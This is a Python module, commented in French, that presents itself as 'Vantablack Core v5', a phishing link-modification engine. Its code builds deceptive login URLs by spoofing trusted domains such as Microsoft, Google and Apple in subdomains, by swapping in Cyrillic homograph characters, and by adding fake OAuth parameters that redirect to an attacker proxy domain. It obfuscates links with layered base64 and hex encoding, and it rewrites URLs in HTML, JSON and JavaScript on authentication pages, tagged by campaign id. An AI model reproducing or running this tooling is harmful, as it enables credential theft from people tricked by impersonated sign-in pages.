"""
Vantablack Core v5 - Advanced Link Modification Engine
=======================================================

Module pour les capacités avancées de modification de liens comme les vrais hackers :
- Réécriture contextuelle basée sur le contenu
- Génération de liens de phishing réalistes
- Support pour différents schémas d'URL
- Obfuscation avancée des liens
- Personnalisation dynamique basée sur la cible
"""

import re
import random
import hashlib
import base64
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode, quote
from typing import Dict, List, Optional, Tuple, Any
import idna


class AdvancedLinkModifier:
    """
    Moteur de modification avancée des liens pour des attaques de phishing plus sophistiquées.
    """
    
    def __init__(self):
        self.proxy_domain = "vantablack-proxy.com"
        self.url_patterns = [
            r'https?://[^\s"\']+',  # URLs HTTP/HTTPS standard
            r'//[^\s"\']+',         # URLs protocol-relative
            r'/[^\s"\']*\.[a-z]{2,6}(?:[/?#][^\s"\']*)?',  # Paths avec extensions
        ]
        
        # Dictionnaires pour la génération réaliste de liens
        self.trusted_domains = [
            'login.microsoftonline.com', 'accounts.google.com', 'facebook.com',
            'appleid.apple.com', 'github.com', 'twitter.com', 'linkedin.com'
        ]
        
        self.credential_paths = [
            '/oauth2/authorize', '/login', '/signin', '/auth', '/authenticate',
            '/verify', '/confirm', '/authorize', '/consent'
        ]
        
        self.param_patterns = {
            'oauth': ['client_id', 'redirect_uri', 'response_type', 'scope', 'state'],
            'microsoft': ['client_id', 'redirect_uri', 'response_type', 'scope', 'state', 'login_hint'],
            'google': ['client_id', 'redirect_uri', 'response_type', 'scope', 'state', 'hd', 'prompt'],
            'generic': ['return', 'next', 'callback', 'continue', 'redirect']
        }
    
    def generate_realistic_phishing_url(self, original_url: str, campaign_id: str) -> str:
        """
        Génère une URL de phishing réaliste qui ressemble à une vraie URL d'authentification.
        
        Args:
            original_url: L'URL originale à imiter
            campaign_id: ID de la campagne pour le tracking
            
        Returns:
            URL de phishing réaliste
        """
        parsed = urlparse(original_url)
        
        # Techniques avancées de camouflage
        techniques = [
            self._technique_subdomain_spoofing,
            self._technique_homograph_attack,
            self._technique_path_obfuscation,
            self._technique_parameter_injection
        ]
        
        # Appliquer une technique aléatoire ou basée sur le domaine cible
        technique = random.choice(techniques)
        phishing_url = technique(parsed, campaign_id)
        
        return phishing_url
    
    def _technique_subdomain_spoofing(self, parsed_url, campaign_id: str) -> str:
        """Technique: Utilisation de sous-domaines qui ressemblent à des domaines de confiance."""
        domain = parsed_url.netloc
        
        # Générer un sous-domaine qui ressemble à un domaine de confiance
        trusted_domain = random.choice(self.trusted_domains)
        subdomain = f"{trusted_domain.replace('.', '-')}.{domain}"
        
        # Construire la nouvelle URL
        new_netloc = subdomain
        new_url = urlunparse((
            parsed_url.scheme,
            new_netloc,
            parsed_url.path,
            parsed_url.params,
            parsed_url.query,
            parsed_url.fragment
        ))
        
        return new_url
    
    def _technique_homograph_attack(self, parsed_url, campaign_id: str) -> str:
        """Technique: Utilisation de caractères homographes pour tromper l'œil."""
        domain = parsed_url.netloc
        
        # Remplacer certains caractères par des homographes
        homograph_map = {
            'a': 'а',  # cyrillic a
            'c': 'с',  # cyrillic c
            'e': 'е',  # cyrillic e
            'o': 'о',  # cyrillic o
            'p': 'р',  # cyrillic p
            'x': 'х',  # cyrillic x
            'y': 'у',  # cyrillic y
        }
        
        new_domain = ''
        for char in domain:
            if char.lower() in homograph_map and random.random() < 0.3:  # 30% de chance de substitution
                new_domain += homograph_map[char.lower()]
            else:
                new_domain += char
        
        # Encoder en punycode pour l'IDN
        try:
            new_domain = idna.encode(new_domain).decode('ascii')
        except:
            pass
        
        new_url = urlunparse((
            parsed_url.scheme,
            new_domain,
            parsed_url.path,
            parsed_url.params,
            parsed_url.query,
            parsed_url.fragment
        ))
        
        return new_url
    
    def _technique_path_obfuscation(self, parsed_url, campaign_id: str) -> str:
        """Technique: Ajout de chemins qui ressemblent à des pages d'authentification légitimes."""
        
        # Ajouter un chemin qui ressemble à une page de confiance
        credential_path = random.choice(self.credential_paths)
        
        # Générer un chemin obfusqué
        if parsed_url.path == '/':
            new_path = credential_path
        else:
            new_path = f"{parsed_url.path}{credential_path}"
        
        # Ajouter des paramètres qui ressemblent à des paramètres OAuth légitimes
        query_params = parse_qs(parsed_url.query)
        
        # Ajouter des paramètres OAuth réalistes
        oauth_params = self._generate_realistic_oauth_params(campaign_id)
        for key, value in oauth_params.items():
            if key not in query_params:
                query_params[key] = [value]
        
        new_query = urlencode(query_params, doseq=True)
        
        new_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            new_path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        return new_url
    
    def _technique_parameter_injection(self, parsed_url, campaign_id: str) -> str:
        """Technique: Injection de paramètres qui semblent légitimes."""
        
        query_params = parse_qs(parsed_url.query)
        
        # Générer des paramètres réalistes basés sur le domaine
        domain_key = self._get_domain_type(parsed_url.netloc)
        realistic_params = self._generate_realistic_params(domain_key, campaign_id)
        
        # Fusionner avec les paramètres existants
        for key, value in realistic_params.items():
            if key not in query_params:
                query_params[key] = [value]
        
        new_query = urlencode(query_params, doseq=True)
        
        new_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        return new_url
    
    def _get_domain_type(self, domain: str) -> str:
        """Détermine le type de domaine pour une génération de paramètres adaptée."""
        domain_lower = domain.lower()
        
        if 'microsoft' in domain_lower or 'office' in domain_lower:
            return 'microsoft'
        elif 'google' in domain_lower or 'gmail' in domain_lower:
            return 'google'
        elif 'facebook' in domain_lower:
            return 'facebook'
        elif 'apple' in domain_lower:
            return 'apple'
        elif 'oauth' in domain_lower or 'auth' in domain_lower:
            return 'oauth'
        else:
            return 'generic'
    
    def _generate_realistic_oauth_params(self, campaign_id: str) -> Dict[str, str]:
        """Génère des paramètres OAuth réalistes."""
        
        params = {
            'client_id': f"{random.randint(100000000, 999999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
            'response_type': random.choice(['code', 'token', 'id_token']),
            'scope': random.choice([
                'openid profile email',
                'user.read mail.read',
                'email profile',
                'openid'
            ]),
            'state': hashlib.sha256(f"{campaign_id}-{random.randint(1000, 9999)}".encode()).hexdigest()[:16],
            'redirect_uri': f"https://{self.proxy_domain}/v5/r/{campaign_id}",
            'nonce': hashlib.sha256(f"nonce-{random.randint(1000, 9999)}".encode()).hexdigest()[:12]
        }
        
        return params
    
    def _generate_realistic_params(self, domain_type: str, campaign_id: str) -> Dict[str, str]:
        """Génère des paramètres réalistes basés sur le type de domaine."""
        
        params = {}
        
        if domain_type == 'microsoft':
            params = {
                'client_id': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}",
                'response_type': 'code',
                'scope': 'user.read',
                'state': hashlib.sha256(f"msft-{campaign_id}".encode()).hexdigest()[:16],
            }
        elif domain_type == 'google':
            params = {
                'client_id': f"{random.randint(100000000000, 999999999999)}-{random.randint(1000, 9999)}.apps.googleusercontent.com",
                'response_type': 'code',
                'scope': 'openid email profile',
                'access_type': 'offline',
                'state': hashlib.sha256(f"google-{campaign_id}".encode()).hexdigest()[:16],
            }
        elif domain_type == 'oauth':
            params = self._generate_realistic_oauth_params(campaign_id)
        else:
            # Paramètres génériques
            params = {
                'return': f"https://{self.proxy_domain}/v5/r/{campaign_id}",
                'next': f"/v5/r/{campaign_id}",
                'callback': f"https://{self.proxy_domain}/v5/callback/{campaign_id}",
            }
        
        return params
    
    def obfuscate_url(self, url: str, method: str = 'base64') -> str:
        """
        Obfusque une URL pour la rendre moins détectable.
        
        Args:
            url: URL à obfusquer
            method: Méthode d'obfuscation ('base64', 'hex', 'reverse', 'multi')
            
        Returns:
            URL obfusquée
        """
        
        if method == 'base64':
            # Encodage Base64
            encoded = base64.urlsafe_b64encode(url.encode()).decode()
            return f"https://{self.proxy_domain}/decode/{encoded}"
        
        elif method == 'hex':
            # Encodage Hex
            hex_encoded = url.encode().hex()
            return f"https://{self.proxy_domain}/h/{hex_encoded}"
        
        elif method == 'reverse':
            # Inversion de l'URL
            reversed_url = url[::-1]
            encoded = base64.urlsafe_b64encode(reversed_url.encode()).decode()
            return f"https://{self.proxy_domain}/rev/{encoded}"
        
        elif method == 'multi':
            # Multi-couche d'obfuscation
            reversed = url[::-1]
            base64_encoded = base64.urlsafe_b64encode(reversed.encode()).decode()
            hex_encoded = base64_encoded.encode().hex()
            return f"https://{self.proxy_domain}/multi/{hex_encoded}"
        
        else:
            return url
    
    def contextual_rewrite(self, content: str, base_url: str, context: Dict[str, Any]) -> str:
        """
        Réécriture contextuelle des URLs basée sur le contenu environnant.
        
        Args:
            content: Contenu à analyser et réécrire
            base_url: URL de base pour les URLs relatives
            context: Contexte supplémentaire (type de contenu, campagne, etc.)
            
        Returns:
            Contenu avec URLs réécrites contextuellement
        """
        
        # Détection du type de contenu
        content_type = context.get('content_type', 'html')
        campaign_id = context.get('campaign_id', '')
        
        if content_type == 'html':
            return self._rewrite_html_contextual(content, base_url, campaign_id)
        elif content_type == 'json':
            return self._rewrite_json_contextual(content, base_url, campaign_id)
        elif content_type == 'javascript':
            return self._rewrite_js_contextual(content, base_url, campaign_id)
        else:
            return self._rewrite_generic_contextual(content, base_url, campaign_id)
    
    def _rewrite_html_contextual(self, content: str, base_url: str, campaign_id: str) -> str:
        """Réécriture contextuelle pour le HTML."""
        # Implémentation simplifiée - utiliserait BeautifulSoup en production
        
        # Patterns pour détection contextuelle
        auth_patterns = [
            r'(?i)login|signin|auth|authenticate|password|credential',
            r'(?i)oauth|openid|saml|jwt',
            r'(?i)microsoft|google|facebook|apple|twitter',
        ]
        
        # Détecter le contexte d'authentification
        is_auth_context = any(re.search(pattern, content) for pattern in auth_patterns)
        
        if is_auth_context:
            # Patterns améliorés pour détecter les URLs dans les attributs HTML
            url_patterns = [
                r'https?://[^\s"\'>]+',  # URLs dans les attributs
                r'"https?://[^\"]+"',   # URLs entre guillemets
                r'\'https?://[^\']+\'',  # URLs entre apostrophes
                r'action=["\'](https?://[^"\']+)["\']',  # Attributs action spécifiques
                r'href=["\'](https?://[^"\']+)["\']',    # Attributs href spécifiques
                r'src=["\'](https?://[^"\']+)["\']',     # Attributs src spécifiques
            ]
            
            # Utiliser des URLs de phishing réalistes pour le contexte d'authentification
            for pattern in url_patterns:
                for url_match in re.finditer(pattern, content):
                    # Extraire l'URL proprement selon le pattern
                    if url_match.groups():
                        original_url = url_match.group(1)  # Groupe capturé
                    else:
                        original_url = url_match.group(0)  # Match complet
                    
                    # Nettoyer les guillemets si présents
                    original_url = original_url.strip('\"\'')
                    
                    # Générer l'URL de phishing réaliste
                    phishing_url = self.generate_realistic_phishing_url(original_url, campaign_id)
                    
                    # Remplacer l'URL originale par la version phishing
                    # en préservant les guillemets et la syntaxe HTML
                    content = re.sub(
                        re.escape(original_url),
                        phishing_url,
                        content
                    )
        
        return content
    
    def _rewrite_json_contextual(self, content: str, base_url: str, campaign_id: str) -> str:
        """Réécriture contextuelle pour le JSON."""
        # Implémentation simplifiée
        try:
            import json
            data = json.loads(content)
            
            # Parcourir récursivement l'objet JSON
            def rewrite_recursive(obj):
                if isinstance(obj, dict):
                    return {k: rewrite_recursive(v) for k, v in obj.items()}
                elif isinstance(obj, list):
                    return [rewrite_recursive(item) for item in obj]
                elif isinstance(obj, str) and obj.startswith(('http://', 'https://')):
                    return self.generate_realistic_phishing_url(obj, campaign_id)
                else:
                    return obj
            
            rewritten_data = rewrite_recursive(data)
            return json.dumps(rewritten_data)
        except:
            return content
    
    def _rewrite_js_contextual(self, content: str, base_url: str, campaign_id: str) -> str:
        """Réécriture contextuelle pour le JavaScript."""
        # Détecter les appels API et les redirections
        api_patterns = [
            r'fetch\([\s\S]*?(["\'])(https?://[^"\']+)\1',
            r'\.open\([\s\S]*?(["\'])(https?://[^"\']+)\1',
            r'window\.location[\s\S]*?=([\s\S]*?(["\'])(https?://[^"\']+)\2)',
        ]
        
        for pattern in api_patterns:
            for match in re.finditer(pattern, content):
                if match.group(2):
                    original_url = match.group(2)
                    phishing_url = self.generate_realistic_phishing_url(original_url, campaign_id)
                    content = content.replace(original_url, phishing_url)
        
        return content
    
    def _rewrite_generic_contextual(self, content: str, base_url: str, campaign_id: str) -> str:
        """Réécriture contextuelle générique."""
        # Réécriture simple pour les autres types de contenu
        for url_match in re.finditer(r'https?://[^\s"\']+', content):
            original_url = url_match.group(0)
            phishing_url = self.generate_realistic_phishing_url(original_url, campaign_id)
            content = content.replace(original_url, phishing_url)
        
        return content


# Instance globale pour une utilisation facile
advanced_link_modifier = AdvancedLinkModifier()